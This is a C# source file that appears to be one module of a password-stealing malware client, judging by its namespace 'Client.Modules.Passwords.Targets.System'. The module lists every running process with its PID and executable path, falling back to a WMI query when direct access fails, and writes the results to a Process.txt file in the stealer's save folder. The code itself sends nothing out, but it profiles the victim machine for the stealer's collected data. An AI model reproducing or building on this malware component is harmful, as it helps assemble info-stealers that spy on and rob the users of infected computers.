using System.Diagnostics;
using System.IO;
using System.Management;

namespace Client.Modules.Passwords.Targets.System;

internal sealed class ProcessList
{
	public static void WriteProcesses(string sSavePath)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			File.AppendAllText(sSavePath + "\\Process.txt", "NAME: " + process.ProcessName + "\n\tPID: " + process.Id + "\n\tEXE: " + ProcessExecutablePath(process) + "\n\n");
		}
	}

	public static string ProcessExecutablePath(Process process)
	{
		try
		{
			return process.MainModule.FileName;
		}
		catch
		{
			foreach (ManagementObject item in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
			{
				object obj2 = item["ProcessID"];
				object obj3 = item["ExecutablePath"];
				if (obj3 != null && obj2.ToString() == process.Id.ToString())
				{
					return obj3.ToString();
				}
			}
		}
		return "";
	}
}
